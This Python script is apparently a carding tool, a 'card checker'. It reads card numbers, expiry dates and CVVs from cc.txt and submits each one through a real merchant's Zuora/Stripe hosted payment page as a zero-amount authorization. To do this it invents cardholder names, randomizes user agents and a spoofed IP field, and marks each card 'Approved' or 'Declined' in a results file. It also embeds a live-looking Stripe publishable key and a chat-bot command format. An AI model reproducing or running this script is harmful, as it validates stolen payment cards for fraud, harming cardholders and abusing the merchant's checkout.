import random
import httpx
import asyncio
import base64
from urllib.parse import quote
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

def Ccs(cc: str, cvv: str, month: str, year: str) -> bytes:
    random_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    data_str = f"#{random_ip}#{cc}#{cvv}#{month}#{year}"
    return base64.b64encode(data_str.encode())

def RsaEncrypt(encoded_data: bytes, PublicKey: str) -> str:
    try:
        key_str = f"-----BEGIN PUBLIC KEY-----\n{PublicKey.strip()}\n-----END PUBLIC KEY-----"
        key = RSA.import_key(key_str)
        cipher = PKCS1_v1_5.new(key)
        encrypted = cipher.encrypt(encoded_data)
        return base64.b64encode(encrypted).decode()
    except Exception as e:
        return f"Error: {str(e)}"

def encrypt_zuora(cc, mes, ano, cvv, public_key):
    encoded_data = Ccs(cc, cvv, mes, ano)
    return RsaEncrypt(encoded_data, public_key)

def capture(string, start, end):
    try:
        return string.split(start)[1].split(end)[0]
    except Exception:
        return ""

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    ]
    return random.choice(agents)

def random_name():
    return random.choice(["John", "Jane", "Alex", "Chris", "Sam", "Taylor", "Jordan"])

def random_last():
    return random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"])

def m2(month, year):
    month = str(month).zfill(2)
    year = str(year)
    return month, year

async def getzuoraStripe1(cc, month, year, cvv):
  client_kwargs = {
      "follow_redirects": True,
      "verify": False,
      "headers": {"User-Agent": random_user_agent()},
      "timeout": httpx.Timeout(30.0)
  }
    
  async with httpx.AsyncClient(**client_kwargs) as s:
    month, year = m2(month, year)
    name = random_name()
    last = random_last()
    
    h =  {"Content-Type": "application/json"}
    
    r = await s.get("https://ssogateway.chaos.com/api/v1/session")
    
    p2 = {"zipCode":"33054","city":"New York","country":"US","address":"3860 NW 125th St"}
    
    r2 = await s.post("https://orders.chaos.com/api/v1/webshop/validate/address", json=p2)

    p3 = {"pageId":"8a12989f87b6eec70187c1f9f7e214b8"}
    
    r3 = await s.post("https://orders.chaos.com/api/v1/webshop/payments/page-signature", headers=h, json=p3)
    t3 = r3.text
    sig = capture(t3, '"signature":"','"')
    if not sig:
      return "ERROR ❌", "CONTACT ADMIN - Signature not found"
      
    sig = quote(sig)
    ti = quote(capture(t3, '"tenantId":"','"'))
    to = quote(capture(t3, '"token":"','"'))

    r4 = await s.get(f"https://www.zuora.com/apps/PublicHostedPageLite.do?method=requestPage&host=https://www.chaos.com/enscape/trial&fromHostedPage=true&signature={sig}&token={to}&tenantId={ti}&style=inline&id=8a12989f87b6eec70187c1f9f7e214b8&submitEnabled=true&locale=en&authorizationAmount=0&field_currency=USD&customizeErrorRequired=true&zlog_level=warn")
    t4 = r4.text
    tk = capture(t4, '"token" value="','"')
    sig = quote(capture(t4, '"signature" value="','"'))
    key = capture(t4, '"field_key" value="','"')

    if cc.startswith("3"):
      type_ = "AmericanExpress"
    elif cc.startswith("4"):
      type_ = "Visa"
    elif cc.startswith("5"):
      type_ = "MasterCard"
    elif cc.startswith("6"):
      type_ = "Discover"
    else:
      type_ = "Visa"
    
    zuora_ = encrypt_zuora(cc, month, year, cvv, key)
    zuora = quote(zuora_)

    h5 = {"Host":"www.zuora.com", "content-type":"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}

    p5 = f"method=submitPage&id=8a12989f87b6eec70187c1f9f7e214b8&tenantId={ti}&token={tk}&signature={sig}&paymentGateway=&field_authorizationAmount=0&field_screeningAmount=&field_currency=USD&field_key=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw%2FPj83U19IjYxkXylsnhQ7raV%2FTwK6cXuPtozVkzLcPnlgYD0aA5Y19UvKHea42qtrGfDSMB24AlbfGy0Skke1xpow5UXrlHZZXO6vPKLd6hwec9ironFmv%2BTThxZtiH06lfdU2LJbPSFTwxfmi%2Fs4L6VmFnCq9APRAYZf66OEetVN7bq6pOf9tmsy3b%2BJEsXezT7XnkVqCSztX1hrvSd4LFeQ1D%2Fx1YESun%2FopXUsMFi%2FATNe1OqZX9T05X3DGFtVCJpIWb2rpMY5aFdyFnoq0p1JScTdxBO4XPFNWaUXL1aCd5GTn2BrW846SgUcqLGiEEYXaCVA0%2BObERwvmwdwIDAQAB&field_style=inline&jsVersion=&field_submitEnabled=true&field_callbackFunctionEnabled=&field_signatureType=&host=https%3A%2F%2Fwww.chaos.com%2Fenscape%2Ftrial&encrypted_fields=%23field_ipAddress%23field_creditCardNumber%23field_cardSecurityCode%23field_creditCardExpirationMonth%23field_creditCardExpirationYear&encrypted_values={zuora}&customizeErrorRequired=true&fromHostedPage=true&isGScriptLoaded=false&is3DSEnabled=&checkDuplicated=&captchaRequired=&captchaSiteKey=&field_mitConsentAgreementSrc=&field_mitConsentAgreementRef=&field_mitCredentialProfileType=&field_agreementSupportedBrands=&paymentGatewayType=Stripe&paymentGatewayVersion=2&is3DS2Enabled=true&cardMandateEnabled=false&zThreeDs2TxId=&threeDs2token=&threeDs2Sig=&threeDs2Ts=&threeDs2OnStep=&threeDs2GwData=&doPayment=&storePaymentMethod=&documents=&xjd28s_6sk=627f82ccf6bf42c8b24bc62a5cb4391d&pmId=&button_outside_force_redirect=false&browserScreenHeight=1080&browserScreenWidth=1920&field_passthrough1=&field_passthrough2=&field_passthrough3=&field_passthrough4=&field_passthrough5=&field_passthrough6=&field_passthrough7=&field_passthrough8=&field_passthrough9=&field_passthrough10=&field_passthrough11=&field_passthrough12=&field_passthrough13=&field_passthrough14=&field_passthrough15=&stripePublishableKey=pk_live_51CQbcBBIMaTsg03r0AO1dYi0nEEJJHFum0RWdoJJDW4zppM1B02RhBa5YrEfjadj5rOGAeLFDoCcAjwogcxCYqXv00ok1W8cw7&isRSIEnabled=false&radarSessionId=&field_accountId=&field_gatewayName=&field_deviceSessionId=&field_ipAddress=&field_useDefaultRetryRule=&field_paymentRetryWindow=&field_maxConsecutivePaymentFailures=&field_creditCardType={type_}&field_creditCardNumber=&field_creditCardExpirationMonth=&field_creditCardExpirationYear=&field_cardSecurityCode=&field_creditCardHolderName={name}+{last}&encodedZuoraIframeInfo=eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6MzI5LCJmb3JtSGVpZ2h0IjozOTIsImxheW91dFN0eWxlIjoiYnV0dG9uSW5zaWRlIiwienVvcmFKc1ZlcnNpb24iOiIiLCJmb3JtRmllbGRzIjpbeyJpZCI6ImZvcm0tZWxlbWVudC1jcmVkaXRDYXJkVHlwZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZE51bWJlciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEV4cGlyYXRpb25ZZWFyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkSG9sZGVyTmFtZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZENvdW50cnkiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRTdGF0ZSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEFkZHJlc3MxIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQWRkcmVzczIiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDaXR5IiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkUG9zdGFsQ29kZSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtcGhvbmUiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWVtYWlsIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9XX0%3D"

    r5 = await s.post("https://www.zuora.com/apps/PublicHostedPageLite.do", headers=h5, data=p5)
    t5 = r5.text
    msg = capture(t5, '"errorMessage":"','"')
    st = capture(t5, '"success":"','"')
    sta = capture(t5, '"status":"','"')

    if not msg:
      msg = sta or "Unknown response"
    
    if st == "true" or sta == "authorized":
      status = "Approved "
      msg = "Approved"
    elif any(kw in msg.lower() for kw in ["funds", "security code is incorrect", "incorrect_zip"]):
      status = "Approved "
    elif "Too many submissions" in msg:
        status = "Declined "
        msg = "Transaction declined (Rate Limit)"
    else:
      status = "Declined "
    
    return status, msg

async def gate_zuora_encrypt(cc, mes, ano, cvv, *args):
    public_key = None
    card_number = cc
    
    if args and len(args) > 0:
        public_key = args[0]
    
    if not public_key and len(mes) > 20:
        public_key = mes
        
    if not public_key:
        return "Declined ❌", "Missing Public Key. Format: .ckgate zuora_encrypt cc|mm|yy|cvv key"
        
    encrypted = encrypt_zuora(card_number, mes, ano, cvv, public_key)
    if "Error" in encrypted:
        return "Declined ❌", encrypted
    return "Approved ✅", f"Encrypted Data: {encrypted}"

async def main():
    try:
        with open("cc.txt", "r") as f:
            lines = f.readlines()
    except FileNotFoundError:
        print("cc.txt not found.")
        return

    for line in lines:
        line = line.strip()
        if not line: continue
        try:
            parts = line.split("|")
            if len(parts) >= 4:
                cc, month, year, cvv = parts[:4]
                status, msg = await getzuoraStripe1(cc, month, year, cvv)
                result = f"{line} -> {status} - {msg}\n"
                print(result.strip())
                with open("result.txt", "a") as f:
                    f.write(result)
            else:
                print(f"Skipping invalid line: {line}")
        except Exception as e:
            print(f"Error processing {line}: {e}")

if __name__ == "__main__":
    asyncio.run(main())
